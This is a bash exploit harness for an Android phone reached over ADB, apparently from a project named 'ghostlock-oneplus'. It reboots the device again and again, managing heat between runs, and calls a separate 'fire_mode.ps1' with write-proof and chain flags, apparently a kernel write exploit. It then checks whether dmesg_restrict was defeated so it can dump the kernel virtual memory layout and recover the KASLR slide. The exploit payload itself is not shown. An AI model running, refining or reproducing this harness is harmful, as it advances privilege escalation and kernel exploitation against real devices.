#!/bin/bash
# ph8: dmesg_restrict=0 then dmesg | memory layout = slide
ADB="/c/Users/LENOVO/AppData/LOCAL/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb.exe"
cd "/c/Users/LENOVO/Desktop/HILY installer/Oppo/ghostlock-oneplus"
MAX=${1:-8}
gettemp() { "$ADB" -s 192.168.1.108:5555 shell "dumpsys battery | grep -i temperature" 2>/dev/null | grep -oE "[0-9]+" | head -1; }
for attempt in $(seq 1 "$MAX"); do
  sleep 30; "$ADB" connect 192.168.1.108:5555 >/dev/null 2>&1
  t=$(gettemp); [ -z "$t" ] && t=0
  echo "A$attempt temp=$((${t:-0}/10)).$((${t:-0}%10))C"
  if [ "$t" -ge 700 ]; then echo "HOT(70) — cooling to 50"; while :; do sleep 120; t=$(gettemp); [ -z "$t" ] && t=0; [ "$t" -le 500 ] && break; echo "  $((${t:-0}/10)).$((${t:-0}%10))C"; done; fi
  pre=$("$ADB" -s 192.168.1.108:5555 shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  [ -z "$pre" ] && { echo "A$attempt: no shell"; continue; }
  "$ADB" -s 192.168.1.108:5555 reboot; sleep 5; ok=0
  for i in $(seq 1 90); do sleep 10; out=$("$ADB" connect 192.168.1.108:5555 2>&1)
    if echo "$out" | grep -q "connected to"; then
      bid=$("$ADB" -s 192.168.1.108:5555 shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
      bc=$("$ADB" -s 192.168.1.108:5555 shell "getprop sys.boot_completed" 2>/dev/null | tr -d '\r')
      if [ "$bc" = "1" ] && [ -n "$bid" ] && [ "$bid" != "$pre" ]; then ok=1; break; fi
    fi; done
  [ "$ok" = "1" ] || { echo "A$attempt: reboot failed"; continue; }
  up=$("$ADB" -s 192.168.1.108:5555 shell 'cat /proc/uptime' | tr -d '\r'); up_s=${up%%.*}
  [ "$up_s" -lt 30 ] && sleep $((30-up_s))
  cls=$(powershell -ExecutionPolicy Bypass -File fire_mode.ps1 -ModeEnv "MODE4_WRITE_PROOF=1 WRITE_PROOF_TARGET=fops MODE4_STATIC_CHAIN=1 MODE4_SC_UMASK=1 MODE4_SELFSTAMP=1 SELFSTAMP_SINGLE=8 MODE4_PROOF=1" -TagPrefix "D8_${attempt}" 2>&1 | grep -aoE "CLASS=[A-Z]+" | head -1)
  dm=$("$ADB" -s 192.168.1.108:5555 shell 'dmesg 2>&1 | head -2' | tr -d '\r' | head -1)
  lay=$("$ADB" -s 192.168.1.108:5555 shell 'dmesg 2>/dev/null | grep -A9 "Virtual kernel memory layout" | head -10' | tr -d '\r')
  echo "A$attempt: $cls dmesg_first=[$dm]"
  if [ -n "$lay" ]; then
    echo "*** DMESG OPEN — MEMORY LAYOUT ***"; echo "$lay"
    "$ADB" -s 192.168.1.108:5555 shell 'dmesg 2>/dev/null | grep -A9 "Virtual kernel memory layout"' > slide_layout.txt 2>/dev/null
    exit 0
  fi
done
echo "ph8 exhausted"; exit 1
